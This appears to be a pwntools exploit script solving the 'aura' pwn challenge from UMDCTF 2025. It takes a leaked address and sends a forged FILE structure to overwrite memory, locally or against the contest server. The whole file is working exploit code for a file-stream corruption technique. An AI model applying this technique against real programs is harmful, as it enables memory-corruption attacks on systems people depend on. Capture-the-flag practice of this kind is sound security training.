#!/usr/bin/env python3
import sys

from pwn import *

context.binary = "/ctf-writeups/2025/umdctf/pwn/aura/dist/aura"
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h", "-p 65"]
elf = context.binary

is_remote = len(sys.argv) == 2 and sys.argv[1] == "remote"


def attach(r):
    if is_remote:
        return

    bkps = []
    gdb.attach(r, "\n".join(f"break {x}" for x in bkps))


def exploit(r):
    attach(r)

    r.recvuntil(b"aura: ")
    aura = int(r.recvline().strip().decode(), 16)

    fs = FileStructure()

    r.sendafter(b"aura? ", fs.read(aura, 0x10))
    pause()
    r.wait(0.1)
    r.send(b"A" * 0x10)

    r.interactive()


if __name__ == "__main__":
    r = remote("challs.umdctf.io", 31006) if is_remote else process(elf.path)
    exploit(r)
    sys.exit()
